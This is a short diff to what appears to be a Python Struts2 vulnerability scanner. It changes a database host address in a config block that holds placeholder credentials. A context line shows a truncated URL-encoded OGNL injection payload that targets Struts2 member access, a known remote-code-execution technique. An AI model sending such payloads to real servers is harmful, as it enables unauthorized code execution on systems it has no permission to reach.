@@ -8,7 +8,7 @@ payload_check = "?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACC
 headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"}
 
 config = {
-'host':'192.168.149.136',
+'host':'127.0.0.1',
 'user':'toor',
 'password':'changeme',
 'port':'3306',
